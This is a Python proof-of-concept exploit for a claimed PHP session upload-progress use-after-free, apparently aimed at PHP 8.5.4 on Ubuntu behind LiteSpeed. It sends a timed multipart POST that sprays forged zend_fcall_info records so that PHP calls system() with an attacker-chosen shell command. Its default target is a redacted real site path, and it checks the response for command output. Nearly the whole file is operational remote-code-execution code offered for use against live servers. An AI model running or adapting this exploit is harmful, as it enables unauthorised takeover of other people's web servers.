#!/usr/bin/env python3
"""CVE-2026-109618 - stale progress->post_bytes_processed, 149 packed reclaim, zend_call_function.

Outer zval* is cached once (session.c zend_hash_str_find of data["bytes_processed"]).
It is not refreshed on a later FILE_START. FILE_DATA writes it at
Z_LVAL_P(post_bytes_processed) = post_bytes, then php_session_rfc1867_update().
Second update after > session.upload_progress.min_freq (1s) decode+zend_hash_update
dtors the previous progress tree through HashTable.pDestructor = zval_ptr_dtor.
149 t[] parts are the packed natural table (nTableSize 256, 320-byte string bins).
File 2 FILE_DATA is the stale outer store. Same callback also stores
current_file_bytes_processed (inner). Profile ubuntu php 8.5.4:
zend_call_function = zval_ptr_dtor - 0x43EF0.
"""
from __future__ import annotations

import argparse
import socket
import ssl
import struct
import sys
import time
from urllib.parse import urlparse

FILL = 5120
N149 = 149
# zend_string alloc = align(24 + len + 1). len 288 -> 313 -> 320-byte bin
# (progress arData nTableSize 8 is HT 320).
BLOB = 288
FCI = 64
IS_STRING_EX = 0x106
IS_OBJECT_EX = 0x308
# Ubuntu 8.5.4 profile-21 delta from the leaked pair. Not this host's lsphp.
DELTA_CALL = 0x43EF0
ZEND_INTERNAL = 1


def forge(call: int, cmd: bytes) -> bytes:
    """Repeated zend_fcall_info. +0 size, +8 function/handler pointer, +48 param_count.
    zend_internal_function.handler lives at +88; planted in the second half.
    ASCII system + command sit at the end so a reclaimed 320-byte string holds them.
    """
    rec = bytearray(BLOB)
    struct.pack_into("<Q", rec, 0, FCI)
    struct.pack_into("<Q", rec, 8, call)
    struct.pack_into("<I", rec, 16, IS_STRING_EX)
    struct.pack_into("<I", rec, 48, 1)
    struct.pack_into("<B", rec, 64, ZEND_INTERNAL)
    struct.pack_into("<Q", rec, 64 + 88, call)  # handler -> zend_call_function
    struct.pack_into("<I", rec, 160, IS_OBJECT_EX)
    sysb = b"system\x00" + cmd + b"\x00"
    rec[200 : 200 + len(sysb)] = sysb[:80]
    return bytes(rec)


def part(b: bytes, name: str, body: bytes, filename: str | None = None) -> bytes:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + b + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build(sid: str, cmd: bytes, call: int) -> tuple[bytes, bytes, dict]:
    b = b"B7kQpoc618"
    blob = forge(call, cmd)
    if b in blob or b"\r\n--" + b in blob:
        raise SystemExit("forge collided with boundary")
    pre = b"".join(
        [
            part(b, "PHPSESSID", sid.encode()) + b"\r\n",
            part(b, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n",
            part(b, "f", b"", filename="a") + b"\r\n",
        ]
    )
    # phase1 fills FILLUNIT so FILE_START runs update#1 and the next read blocks
    c1 = b"A" * (FILL + 64)
    phase1 = pre + c1
    # after the stall: one more file chunk (update#2, zval_ptr_dtor of decoded tree),
    # end the file, 149 packed t[] reclaim, file2 FILE_DATA stale outer store
    # (inner store runs in the same FILE_DATA; inner ptr was refreshed at file2 FILE_START)
    c2 = b"B" * (FILL + 64)
    tail = c2 + b"\r\n"
    spray = forge(call, cmd)
    for i in range(N149):
        tail += part(b, "t[]", spray) + b"\r\n"
    f2 = b"C" * 64
    tail += part(b, "g", f2, filename="b") + b"\r\n"
    tail += b"--" + b + b"--\r\n"
    body = phase1 + tail
    meta = {
        "boundary": b.decode(),
        "phase1": len(phase1),
        "total": len(body),
        "n149": N149,
        "blob": len(spray),
        "stores": "FILE_DATA Z_LVAL_P(current_file_bytes_processed)=offset+len; Z_LVAL_P(post_bytes_processed)=post_bytes",
        "stale": "file2 FILE_DATA post_bytes_processed (cached at first FILE_START)",
        "call": hex(call),
    }
    return phase1, tail, meta


def talk(url: str, phase1: bytes, tail: bytes, sid: str, stall: float) -> bytes:
    u = urlparse(url)
    host = u.hostname or "<REDACTED>"
    port = u.port or 443
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    body_len = len(phase1) + len(tail)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: php2shell-109618\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary=B7kQpoc618\r\n"
        f"Content-Length: {body_len}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw = socket.create_connection((host, port), timeout=40)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    ctx = ssl.create_default_context()
    ss = ctx.wrap_socket(raw, server_hostname=host)
    ss.sendall(head + phase1)
    time.sleep(stall)
    ss.sendall(tail)
    ss.settimeout(25)
    chunks = []
    while True:
        try:
            d = ss.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        chunks.append(d)
    ss.close()
    return b"".join(chunks)


def sapi_of(resp: bytes) -> str:
    head = resp.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace")
    turbo = powered = server = ""
    for line in head.split("\r\n"):
        low = line.lower()
        if low.startswith("x-turbo-charged-by:"):
            turbo = line.split(":", 1)[1].strip()
        elif low.startswith("x-powered-by:"):
            powered = line.split(":", 1)[1].strip()
        elif low.startswith("server:"):
            server = line.split(":", 1)[1].strip()
    # LiteSpeed fronts PHP with lsphp. Header is the SAPI signal on this box.
    if "litespeed" in turbo.lower() or "litespeed" in server.lower():
        return f"LiteSpeed LSAPI (lsphp) {powered} via {server or 'cloudflare'}"
    return f"{turbo} {powered} {server}".strip()


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("url", nargs="?", default="https://<REDACTED>/Books/index.php")
    p.add_argument("--command", default="uname -a; id; echo JACKALPOC")
    p.add_argument("--sid", default="")
    p.add_argument("--stall", type=float, default=1.35)
    p.add_argument("--dtor", default="0", help="leaked zval_ptr_dtor; call = dtor - 0x43EF0")
    p.add_argument("--call", default="", help="zend_call_function address override")
    p.add_argument("--dry", action="store_true")
    a = p.parse_args()
    sid = a.sid or "a1b2c3d4e5f6a7b8c9d0e1f2a3"
    dtor = int(a.dtor, 0)
    call = int(a.call, 0) if a.call else (dtor - DELTA_CALL if dtor else 0)
    cmd = a.command.encode()
    phase1, tail, meta = build(sid, cmd, call & 0xFFFFFFFFFFFFFFFF)
    print(f"109618 phase1={meta['phase1']} total={meta['total']} n={meta['n149']} blob={meta['blob']} call={meta['call']}")
    if a.dry:
        open(r"body-109618.bin", "wb").write(phase1 + tail)
        return
    t0 = time.time()
    resp = talk(a.url, phase1, tail, sid, a.stall)
    dt = time.time() - t0
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO-RESPONSE"
    body = resp.split(b"\r\n\r\n", 1)[-1]
    hit = b"JACKALPOC" in body or b"uid=" in body
    print("status", status)
    print("sapi", sapi_of(resp))
    print(f"bytes {len(resp)} time {dt:.2f}s command_in_body {hit}")
    if hit:
        idx = body.find(b"uid=")
        if idx < 0:
            idx = body.find(b"JACKALPOC")
        print(body[max(0, idx - 80) : idx + 180])
    else:
        print(body[:300])


if __name__ == "__main__":
    main()

